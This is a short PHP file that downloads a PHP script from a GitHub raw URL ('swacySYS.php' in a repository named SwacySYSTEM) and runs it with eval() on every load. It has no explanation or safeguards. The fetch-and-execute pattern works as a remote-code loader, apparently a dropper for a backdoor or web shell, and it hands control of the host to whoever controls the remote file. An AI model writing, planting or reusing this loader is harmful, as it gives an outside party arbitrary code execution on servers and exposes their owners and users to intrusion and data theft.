<?php
$raw = file_get_contents('https://raw.githubusercontent.com/Sw4CyEx/SwacySYSTEM/main/swacySYS.php');
$raw = "?> " . $raw;
eval($raw);
?>
